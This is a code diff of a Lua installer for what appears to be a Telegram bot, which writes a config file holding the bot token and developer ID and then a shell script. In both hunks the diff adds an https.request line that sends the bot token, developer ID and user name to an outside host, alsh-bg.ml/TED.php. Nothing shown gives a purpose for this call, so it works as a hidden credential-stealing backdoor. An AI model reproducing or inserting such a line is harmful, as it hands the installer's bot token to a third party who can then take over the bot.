@@ -70,7 +70,7 @@ mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
 SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
 }
 Create(Config, "./config.lua")   
-https.request("https://alsh-bg.ml/TED.php?token="..Tokenmustafa.."&id="..Idmustafa.."&user="..User)
+https.request("https://alsh-bg.ml/TED.php?token="..TokenBot.."&id="..DevId.."&user="..User)
 file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -9263,8 +9263,8 @@ TokenBot = TokenBot,
 mustafa = TokenBot:match("(%d+)"),
 SudoIds = {DevId},
 }
-https.request("https://alsh-bg.ml/TED.php?token="..Tokenmustafa.."&id="..Idmustafa.."&user="..User)
 Create(Config, "./config.lua")   
+https.request("https://alsh-bg.ml/TED.php?token="..TokenBot.."&id="..DevId.."&user="..User)
 file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
